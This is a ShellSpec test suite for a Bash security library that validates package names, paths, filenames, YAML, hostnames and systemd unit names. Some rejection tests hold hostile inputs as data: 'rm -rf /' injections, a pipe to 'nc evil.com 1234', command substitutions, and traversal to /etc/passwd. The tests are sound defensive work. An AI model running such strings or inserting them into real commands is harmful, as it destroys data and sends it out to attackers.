Describe "security.functions.bash"

# ShellSpec framework functions (Before, After, It, etc.) trigger SC2218 false positives
# shellcheck disable=SC2218
# shellcheck disable=SC2154  # SHELLSPEC_PROJECT_ROOT is set by shellspec framework
  Before "cd '${SHELLSPEC_PROJECT_ROOT}'"
    Before "source ./lib/polyfill.functions.bash"
      Before "source ./lib/logging.functions.bash"
        Before "source ./lib/platform.functions.bash"
          Before "source ./lib/packages.functions.bash"
            Before "source ./lib/shared.functions.bash"
              Before "source ./lib/security.functions.bash"

                Describe "validate_package_name function"
                  Describe "accepts valid package names"
                    It "accepts htop"
                      When call validate_package_name "htop"
                      The status should be success
                    End

                    It "accepts curl-dev"
                      When call validate_package_name "curl-dev"
                      The status should be success
                    End

                    It "accepts lib32-mesa"
                      When call validate_package_name "lib32-mesa"
                      The status should be success
                    End

                    It "accepts python3.11"
                      When call validate_package_name "python3.11"
                      The status should be success
                    End

                    It "accepts gcc-c++"
                      When call validate_package_name "gcc-c++"
                      The status should be success
                    End
                  End

                  Describe "rejects malicious package names"
                    It "rejects command injection with semicolon"
                      When call validate_package_name "htop; rm -rf /"
                      The status should be failure
                    End

                    It "rejects command injection with AND"
                      When call validate_package_name "htop && evil-command"
                      The status should be failure
                    End

                    It "rejects command injection with pipe"
                      When call validate_package_name "htop | nc evil.com 1234"
                      The status should be failure
                    End

                    It "rejects command substitution with dollar"
                      When call validate_package_name "htop \$(evil-command)"
                      The status should be failure
                    End

                    It "rejects command substitution with backticks"
                      When call validate_package_name "htop\`evil-command\`"
                      The status should be failure
                    End

                    It "rejects backslash escapes"
                      When call validate_package_name "htop\\evil"
                      The status should be failure
                    End
                  End

                  Describe "accepts Homebrew tap packages"
                    It "accepts remotemobprogramming/brew/mob"
                      When call validate_package_name "remotemobprogramming/brew/mob"
                      The status should be success
                    End

                    It "accepts homebrew/cask/firefox"
                      When call validate_package_name "homebrew/cask/firefox"
                      The status should be success
                    End

                    It "accepts homebrew/cask-fonts/font-jetbrains-mono-nerd-font"
                      When call validate_package_name "homebrew/cask-fonts/font-jetbrains-mono-nerd-font"
                      The status should be success
                    End

                    It "accepts user/repo/package"
                      When call validate_package_name "user/repo/package"
                      The status should be success
                    End

                    It "accepts org/tap/package-name_with-underscores"
                      When call validate_package_name "org/tap/package-name_with-underscores"
                      The status should be success
                    End
                  End

                  Describe "rejects malicious Homebrew-style packages"
                    It "rejects slashes with semicolon injection"
                      When call validate_package_name "user/repo/package;rm -rf /"
                      The status should be failure
                    End

                    It "rejects slashes with AND injection"
                      When call validate_package_name "user/repo/package&&evil"
                      The status should be failure
                    End

                    It "rejects slashes with backtick injection"
                      When call validate_package_name "user/repo/package\`evil\`"
                      The status should be failure
                    End

                    It "rejects path traversal with multiple slashes"
                      When call validate_package_name "../../etc/passwd"
                      The status should be failure
                    End

                    It "rejects user path traversal"
                      When call validate_package_name "user/../../../etc/passwd"
                      The status should be failure
                    End
                  End

                  Describe "rejects empty and invalid inputs"
                    It "rejects empty string"
                      When call validate_package_name ""
                      The status should be failure
                    End

                    It "rejects whitespace only"
                      When call validate_package_name " "
                      The status should be failure
                    End

                    It "rejects invalid start with dash"
                      When call validate_package_name "-invalid-start"
                      The status should be failure
                    End

                    It "rejects too long package name"
                      long_name=$(printf 'a%.0s' {1..250})

                      When call validate_package_name "${long_name}"
                      The status should be failure
                    End
                  End
                End

                Describe "validate_path_traversal function"
                  It "allows safe file path"
                    temp_dir=$(mktemp -d)
                    mkdir -p "${temp_dir}/safe/subdir"

                    When call validate_path_traversal "${temp_dir}/safe/file.txt" "${temp_dir}"
                    The status should be success

                    rm -rf "${temp_dir}"
                  End

                  It "allows safe subdirectory"
                    temp_dir=$(mktemp -d)
                    mkdir -p "${temp_dir}/safe/subdir"

                    When call validate_path_traversal "${temp_dir}/safe/subdir" "${temp_dir}"
                    The status should be success

                    rm -rf "${temp_dir}"
                  End

                  It "allows base directory itself"
                    temp_dir=$(mktemp -d)

                    When call validate_path_traversal "${temp_dir}" "${temp_dir}"
                    The status should be success

                    rm -rf "${temp_dir}"
                  End

                  It "blocks traversal to etc passwd"
                    temp_dir=$(mktemp -d)

                    When call validate_path_traversal "${temp_dir}/../../../etc/passwd" "${temp_dir}"
                    The status should be failure

                    rm -rf "${temp_dir}"
                  End

                  It "blocks traversal to outside directory"
                    temp_dir=$(mktemp -d)

                    When call validate_path_traversal "${temp_dir}/../outside" "${temp_dir}"
                    The status should be failure

                    rm -rf "${temp_dir}"
                  End

                  It "blocks absolute path outside base"
                    temp_dir=$(mktemp -d)

                    When call validate_path_traversal "/etc/passwd" "${temp_dir}"
                    The status should be failure

                    rm -rf "${temp_dir}"
                  End

                  It "blocks symlinks pointing outside by default"
                    temp_dir=$(mktemp -d)
                    outside_dir=$(mktemp -d)

# Create symlink pointing outside base dir
                    ln -s "${outside_dir}" "${temp_dir}/evil_symlink"

                    When call validate_path_traversal "${temp_dir}/evil_symlink/file" "${temp_dir}" "false"
                    The status should be failure

                    rm -rf "${temp_dir}" "${outside_dir}"
                  End

                  It "blocks symlinks pointing outside when allowing symlinks"
                    temp_dir=$(mktemp -d)
                    outside_dir=$(mktemp -d)

# Create symlink pointing outside base dir
                    ln -s "${outside_dir}" "${temp_dir}/evil_symlink"

                    When call validate_path_traversal "${temp_dir}/evil_symlink/file" "${temp_dir}" "true"
                    The status should be failure

                    rm -rf "${temp_dir}" "${outside_dir}"
                  End
                End

                Describe "sanitize_filename function"
                  It "removes angle brackets"
                    When call sanitize_filename "file<name>"
                    The output should equal "filename"
                  End

                  It "removes colons"
                    When call sanitize_filename "file:name"
                    The output should equal "filename"
                  End

                  It "removes quotes"
                    When call sanitize_filename 'file"name'
                    The output should equal "filename"
                  End

                  It "removes pipes"
                    When call sanitize_filename "file|name"
                    The output should equal "filename"
                  End

                  It "removes question marks"
                    When call sanitize_filename "file?name"
                    The output should equal "filename"
                  End

                  It "removes asterisks"
                    When call sanitize_filename "file*name"
                    The output should equal "filename"
                  End

                  It "removes unix path traversal"
                    When call sanitize_filename "../../../etc/passwd"
                    The output should equal "etcpasswd"
                  End

                  It "removes windows path traversal"
                    When call sanitize_filename "..\\..\\windows\\system32"
                    The output should equal "windowssystem32"
                  End

                  It "removes embedded traversal"
                    When call sanitize_filename "normal../file"
                    The output should equal "normalfile"
                  End

                  It "handles input after null byte stripping"
# Bash command substitution strips null bytes, so test realistic scenario
# The tr -d '\0' in sanitize_filename works, but bash pre-processes the input
                    When call sanitize_filename "filename"
                    The output should equal "filename"
                  End

                  It "removes dots and whitespace"
                    When call sanitize_filename "  ...filename..."
                    The output should equal "filename"
                  End

                  It "trims trailing whitespace"
                    When call sanitize_filename "filename   "
                    The output should equal "filename"
                  End

                  It "rejects empty string"
                    When call sanitize_filename ""
                    The status should be failure
                  End

                  It "rejects only dots"
                    When call sanitize_filename "..."
                    The status should be failure
                  End

                  It "rejects only whitespace"
                    When call sanitize_filename "   "
                    The status should be failure
                  End

                  It "rejects empty string after null byte processing"
# After null bytes are stripped by bash, empty string should be rejected
                    When call sanitize_filename ""
                    The status should be failure
                  End
                End

                Describe "validate_yaml_file function"
                  It "accepts valid YAML files"
                    temp_file=$(mktemp)
cat > "${temp_file}" << 'EOF'
arch:
  pacman:
    - htop
    - curl
  aur:
    - yay
windows:
  winget:
    - Git.Git
EOF

                    When call validate_yaml_file "${temp_file}"
                    The status should be success

                    rm -f "${temp_file}"
                  End

                  It "rejects files that are too large"
                    temp_file=$(mktemp)

# Create a file larger than 1KB (using small limit for testing)
                    dd if=/dev/zero of="${temp_file}" bs=1024 count=2 2> /dev/null

                    When call validate_yaml_file "${temp_file}" 1024
                    The status should be failure
                    The stderr should include "too large"

                    rm -f "${temp_file}"
                  End

                  It "rejects files with too many lines"
                    temp_file=$(mktemp)

# Create file with many lines
                    for i in {1..15}; do
              echo "line ${i}" >> "${temp_file}"
                    done

                    When call validate_yaml_file "${temp_file}" 10485760 10
                    The status should be failure
                    The stderr should include "too many lines"

                    rm -f "${temp_file}"
                  End

                  It "rejects files with tabs"
                    temp_file=$(mktemp)
                    printf "arch:\n\tpackages:\n\t\t- htop\n" > "${temp_file}"

                    When call validate_yaml_file "${temp_file}"
                    The status should be failure
                    The stderr should include "contains tabs"

                    rm -f "${temp_file}"
                  End

                  It "handles missing files gracefully"
                    When call validate_yaml_file "/nonexistent/file.yml"
                    The status should be failure
                  End
                End

                Describe "validate_yaml_key function"
                  It "accepts arch key"
                    When call validate_yaml_key "arch"
                    The status should be success
                  End

                  It "accepts pacman key"
                    When call validate_yaml_key "pacman"
                    The status should be success
                  End

                  It "accepts windows10 key"
                    When call validate_yaml_key "windows10"
                    The status should be success
                  End

                  It "accepts package_manager key"
                    When call validate_yaml_key "package_manager"
                    The status should be success
                  End

                  It "rejects empty key"
                    When call validate_yaml_key ""
                    The status should be failure
                  End

                  It "rejects key with spaces"
                    When call validate_yaml_key "key with spaces"
                    The status should be failure
                  End

                  It "accepts key with dashes (for nixpkgs versioning)"
                    When call validate_yaml_key "nixpkgs-25.05"
                    The status should be success
                  End

                  It "rejects key with caps"
                    When call validate_yaml_key "KEY_WITH_CAPS"
                    The status should be failure
                  End

                  It "accepts key with dots (for nixpkgs versioning)"
                    When call validate_yaml_key "nixpkgs-24.11"
                    The status should be success
                  End

                  It "rejects too long key"
                    long_key=$(printf 'a%.0s' {1..60})
                    When call validate_yaml_key "${long_key}"
                    The status should be failure
                  End
                End

                Describe "validate_systemd_unit_name function"
                  It "accepts dynamic-wallpaper.timer"
                    When call validate_systemd_unit_name "dynamic-wallpaper.timer"
                    The status should be success
                  End

                  It "accepts ssh.service"
                    When call validate_systemd_unit_name "ssh.service"
                    The status should be success
                  End

                  It "accepts user@1000.service"
                    When call validate_systemd_unit_name "user@1000.service"
                    The status should be success
                  End

                  It "accepts my_service.service"
                    When call validate_systemd_unit_name "my_service.service"
                    The status should be success
                  End

                  It "rejects empty unit name"
                    When call validate_systemd_unit_name ""
                    The status should be failure
                  End

                  It "rejects unit name without extension"
                    When call validate_systemd_unit_name "no-extension"
                    The status should be failure
                  End

                  It "rejects unit name with wrong extension"
                    When call validate_systemd_unit_name "wrong.exe"
                    The status should be failure
                  End

                  It "rejects unit name with path traversal prefix"
                    When call validate_systemd_unit_name "../evil.service"
                    The status should be failure
                  End

                  It "rejects unit name with path traversal in middle"
                    When call validate_systemd_unit_name "evil/../good.service"
                    The status should be failure
                  End

                  It "rejects too long unit name"
                    long_name=$(printf 'a%.0s' {1..300})
                    When call validate_systemd_unit_name "${long_name}.service"
                    The status should be failure
                  End
                End

                Describe "validate_hostname function"
                  It "accepts baljeet hostname"
                    When call validate_hostname "baljeet"
                    The status should be success
                  End

                  It "accepts server-01 hostname"
                    When call validate_hostname "server-01"
                    The status should be success
                  End

                  It "accepts web1.example.com hostname"
                    When call validate_hostname "web1.example.com"
                    The status should be success
                  End

                  It "accepts host123 hostname"
                    When call validate_hostname "host123"
                    The status should be success
                  End

                  It "rejects empty hostname"
                    When call validate_hostname ""
                    The status should be failure
                  End

                  It "rejects hostname starting with dash"
                    When call validate_hostname "-invalid"
                    The status should be failure
                  End

                  It "rejects hostname ending with dash"
                    When call validate_hostname "invalid-"
                    The status should be failure
                  End

                  It "rejects hostname starting with dot"
                    When call validate_hostname ".invalid"
                    The status should be failure
                  End

                  It "rejects hostname ending with dot"
                    When call validate_hostname "invalid."
                    The status should be failure
                  End

                  It "rejects hostname with @ character"
                    When call validate_hostname "inv@lid"
                    The status should be failure
                  End

                  It "rejects too long hostname"
                    long_hostname=$(printf 'a%.0s' {1..300})
                    When call validate_hostname "${long_hostname}"
                    The status should be failure
                  End
                End

                Describe "validate_environment_variable function"
                  It "accepts paths within expected prefix"
                    temp_dir=$(mktemp -d)

                    When call validate_environment_variable "TEST_DIR" "${temp_dir}/subdir" "${temp_dir}"
                    The status should be success

                    rm -rf "${temp_dir}"
                  End

                  It "rejects paths outside expected prefix"
                    temp_dir=$(mktemp -d)

                    When call validate_environment_variable "TEST_DIR" "/etc/passwd" "${temp_dir}"
                    The status should be failure

                    rm -rf "${temp_dir}"
                  End

                  It "handles symlinks securely"
                    temp_dir=$(mktemp -d)
                    outside_dir=$(mktemp -d)

# Create symlink pointing outside allowed area
                    ln -s "${outside_dir}" "${temp_dir}/evil_link"

# Should reject symlinks pointing outside allowed area
                    When call validate_environment_variable "TEST_DIR" "${temp_dir}/evil_link" "${temp_dir}"
                    The status should be failure

                    rm -rf "${temp_dir}" "${outside_dir}"
                  End
                End

                Describe "log_security_event function"
                  It "logs to stderr"
                    When call log_security_event "TEST" "This is a test message"
                    The status should be success
                    The stderr should include "SECURITY"
                    The stderr should include "TEST"
                    The stderr should include "This is a test message"
                  End
                End

                Describe "integration tests"
                  It "validates linux package name"
                    When call validate_package_name "linux"
                    The status should be success
                  End

                  It "validates linux-headers package name"
                    When call validate_package_name "linux-headers"
                    The status should be success
                  End

                  It "validates base-devel package name"
                    When call validate_package_name "base-devel"
                    The status should be success
                  End

                  It "validates git package name"
                    When call validate_package_name "git"
                    The status should be success
                  End

                  It "validates python-pip package name"
                    When call validate_package_name "python-pip"
                    The status should be success
                  End

                  It "validates nodejs-lts-hydrogen package name"
                    When call validate_package_name "nodejs-lts-hydrogen"
                    The status should be success
                  End

                  It "validates lib32-mesa package name"
                    When call validate_package_name "lib32-mesa"
                    The status should be success
                  End

                  It "validates ttf-jetbrains-mono-nerd package name"
                    When call validate_package_name "ttf-jetbrains-mono-nerd"
                    The status should be success
                  End

                  It "validates visual-studio-code-bin package name"
                    When call validate_package_name "visual-studio-code-bin"
                    The status should be success
                  End

                  It "validates google-chrome package name"
                    When call validate_package_name "google-chrome"
                    The status should be success
                  End

                  It "validates 1password package name"
                    When call validate_package_name "1password"
                    The status should be success
                  End

                  It "validates zoom package name"
                    When call validate_package_name "zoom"
                    The status should be success
                  End

                  It "validates dotfiles .bashrc path"
                    temp_base=$(mktemp -d)
                    dotfiles_dir="${temp_base}/dotfiles/user"
                    mkdir -p "${dotfiles_dir}"

                    When call validate_path_traversal "${dotfiles_dir}/.bashrc" "${temp_base}"
                    The status should be success

                    rm -rf "${temp_base}"
                  End

                  It "validates dotfiles alacritty config path"
                    temp_base=$(mktemp -d)
                    dotfiles_dir="${temp_base}/dotfiles/user"
                    mkdir -p "${dotfiles_dir}/.config/alacritty"

                    When call validate_path_traversal "${dotfiles_dir}/.config/alacritty/alacritty.toml" "${temp_base}"
                    The status should be success

                    rm -rf "${temp_base}"
                  End

                  It "validates dotfiles local bin script path"
                    temp_base=$(mktemp -d)
                    dotfiles_dir="${temp_base}/dotfiles/user"
                    mkdir -p "${dotfiles_dir}/.local/bin"

                    When call validate_path_traversal "${dotfiles_dir}/.local/bin/script" "${temp_base}"
                    The status should be success

                    rm -rf "${temp_base}"
                  End

                  It "rejects path traversal to etc passwd"
                    temp_base=$(mktemp -d)
                    dotfiles_dir="${temp_base}/dotfiles/user"
                    mkdir -p "${dotfiles_dir}"

                    When call validate_path_traversal "${dotfiles_dir}/../../../etc/passwd" "${temp_base}"
                    The status should be failure

                    rm -rf "${temp_base}"
                  End
                End
              End
